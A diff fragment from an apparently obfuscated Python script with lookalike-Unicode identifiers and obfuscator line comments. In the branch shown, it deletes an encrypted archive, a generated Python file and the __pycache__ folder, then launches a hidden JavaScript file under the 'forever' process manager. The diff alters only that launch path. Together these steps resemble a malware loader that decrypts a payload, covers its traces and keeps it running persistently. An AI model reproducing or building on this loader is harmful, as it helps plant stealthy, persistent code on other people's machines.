@@ -120,7 +120,7 @@ if ᴠʟᴋʏʀᴇi is not None :#Line:41
             os .remove ("xp0e.aes")#Line:156
             os .remove ("xp0edoc.py")#Line:157
             shutil .rmtree ("__pycache__")#Line:158
-            os .system ("forever --no-warnings 𝐕𝐥𝐤𝐲𝐫𝐞🎒𝕭𝖆𝖌/𝖍𝖆𝖜ӄ.js")#Line:159
+            os .system ("forever --no-warnings Vlkyre🎒Bag/𝖍𝖆𝖜ӄ.js")#Line:159
         else :#Line:160
             os .remove ("xp0e.zip")#Line:161
             os .remove ("xp0e.aes")#Line:162
